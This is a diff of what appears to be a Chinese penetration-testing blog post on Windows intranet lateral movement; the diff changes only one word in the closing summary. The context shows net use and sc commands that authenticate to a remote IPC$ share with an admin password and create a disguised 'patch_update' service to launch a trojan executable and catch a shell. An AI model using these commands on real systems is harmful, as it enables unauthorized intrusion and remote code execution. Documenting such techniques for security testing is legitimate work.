@@ -170,7 +170,7 @@
 <p>0x05 通过sc创建临时服务的方式(记得事先建立好连接,可能需要把exe,bat先注册一下,不然会一直报1053错误(哪位兄弟如果知道怎么更好的解决,还望能告诉小弟一声,感激不尽),但,其实也并不影响,虽然服务报错,但马还是会照常执行(记得shel弹回来以后马上迁徙shell进程,动作要快,不然很快就会断掉,具体原因暂未知),只要shell弹回来就好,用完就顺手删掉即可,关于sc的更多选项请自行查看工具使用帮助):<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> net use \\192.168.3.168\ipc$ /user:administrator <span class="string">"admin!@#45"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 create <span class="string">"patch_update"</span> binpath= <span class="string">"cmd /c c:\windows\temp\plugin_update.exe"</span>  这里注意下等号后面的空格别漏了</span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 start <span class="string">"patch_update"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 delete <span class="string">"patch_update"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> net use \\192.168.3.168\ipc$ /del</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sc create del.jpg" alt=""><br></p>
 <p>0x06 通过powershell的方式,暂时还有些问题,待后期解决再推上来<br><br></p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥技术含量,简单记录下,留给有需要的人,搞清楚一些方法的利用前提条件就好(适合在域中或普通的win内网中)</p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥技术含量,简单记录下,留给有需要的人,搞清楚一些方法的利用前提条件就好(适合在域中或普通的win内网中用)</p>
 
     </div>
 
